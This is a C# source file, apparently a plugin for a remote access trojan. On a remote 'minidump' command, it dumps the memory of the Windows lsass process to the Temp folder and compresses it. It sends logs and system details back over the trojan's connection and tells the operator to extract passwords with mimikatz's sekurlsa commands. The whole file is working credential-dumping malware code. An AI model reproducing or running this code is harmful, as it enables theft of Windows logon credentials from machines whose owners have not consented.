using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "minidump":
                        {
                            Minidump();
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void Compress(string inFile, string outFile)
        {
            try
            {
                if (File.Exists(outFile))
                {
                    Log(Connection.Hwid + ":[-] Output file already exists, removing...");
                    //Console.WriteLine("[X] Output file '{0}' already exists, removing", outFile);
                    File.Delete(outFile);
                }

                var bytes = File.ReadAllBytes(inFile);
                using (FileStream fs = new FileStream(outFile, FileMode.CreateNew))
                {
                    using (GZipStream zipStream = new GZipStream(fs, CompressionMode.Compress, false))
                    {
                        zipStream.Write(bytes, 0, bytes.Length);
                    }
                }
            }
            catch (Exception ex)
            {
                Log(Connection.Hwid + ":[-] Exception while compressing file.");
                Error(ex.Message);
            }
        }
        public static void Minidump()
        {
            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            string dumpDir = String.Format("{0}\\Temp\\", systemRoot);
            if (!Directory.Exists(dumpDir))
            {
                Log(Connection.Hwid + String.Format(":[-] Dump directory \"{0}\" doesn't exist!\n", dumpDir));
                //Console.WriteLine(String.Format("\n[X] Dump directory \"{0}\" doesn't exist!\n", dumpDir));
                return;
            }

            IntPtr targetProcessHandle = IntPtr.Zero;
            uint targetProcessId = 0;

            Process targetProcess = null;
            Process[] processes = Process.GetProcessesByName("lsass");
            targetProcess = processes[0];

            if (targetProcess.ProcessName == "lsass" && !IsHighIntegrity())
            {
                Log(Connection.Hwid + ":[-] Not in high integrity, unable to MiniDump!");
                //Console.WriteLine("\n[X] Not in high integrity, unable to MiniDump!\n");
                return;
            }

            try
            {
                targetProcessId = (uint)targetProcess.Id;
                targetProcessHandle = targetProcess.Handle;
            }
            catch (Exception ex)
            {
                Log(Connection.Hwid + String.Format(":[-] Error getting handle to {0} ({1}): {2}\n", targetProcess.ProcessName, targetProcess.Id, ex.Message));
                //Console.WriteLine(String.Format("\n[X] Error getting handle to {0} ({1}): {2}\n", targetProcess.ProcessName, targetProcess.Id, ex.Message));
                return;
            }
            bool bRet = false;
            string dumpFile = String.Format("{0}\\Temp\\debug{1}.out", systemRoot, targetProcessId);
            string zipFile = String.Format("{0}\\Temp\\debug{1}.bin", systemRoot, targetProcessId);

            Log(Connection.Hwid + String.Format(":[*] Dumping {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.Id, dumpFile));
            //Console.WriteLine(String.Format("\n[*] Dumping {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.Id, dumpFile));

            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
                bRet = MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }

            // if successful
            if (bRet)
            {
                Log(Connection.Hwid + ":[+] Dump successful!");
                Log(Connection.Hwid + String.Format(":[*] Compressing {0} to {1} gzip file", dumpFile, zipFile));
                //Console.WriteLine("[+] Dump successful!");
                //Console.WriteLine(String.Format("\n[*] Compressing {0} to {1} gzip file", dumpFile, zipFile));

                Compress(dumpFile, zipFile);

                Log(Connection.Hwid + String.Format(":[*] Deleting {0}", dumpFile));
                //Console.WriteLine(String.Format("[*] Deleting {0}", dumpFile));
                File.Delete(dumpFile);
                Log(Connection.Hwid + String.Format(":[+] Dumping completed. Rename file to \"debug{0}.gz\" to decompress.", targetProcessId));
                //Console.WriteLine("\n[+] Dumping completed. Rename file to \"debug{0}.gz\" to decompress.", targetProcessId);

                string arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
                string OS = "";
                var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
                if (regKey != null)
                {
                    OS = String.Format("{0}", regKey.GetValue("ProductName"));
                }

                Log(Connection.Hwid + String.Format(":[*] Operating System : {0}", OS));
                Log(Connection.Hwid + String.Format(":[*] Architecture     : {0}", arch));
                Log(Connection.Hwid + String.Format(":[*] Use \"sekurlsa::minidump debug.out\" \"sekurlsa::logonPasswords full\" on the same OS/arch\n", arch));
                //Console.WriteLine(String.Format("\n[*] Operating System : {0}", OS));
                //Console.WriteLine(String.Format("[*] Architecture     : {0}", arch));
                //Console.WriteLine(String.Format("[*] Use \"sekurlsa::minidump debug.out\" \"sekurlsa::logonPasswords full\" on the same OS/arch\n", arch));
            }
            else
            {
                Log(Connection.Hwid + String.Format(":[-] Dump failed: {0}", bRet));
                //Console.WriteLine(String.Format("[X] Dump failed: {0}", bRet));
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }

    }

}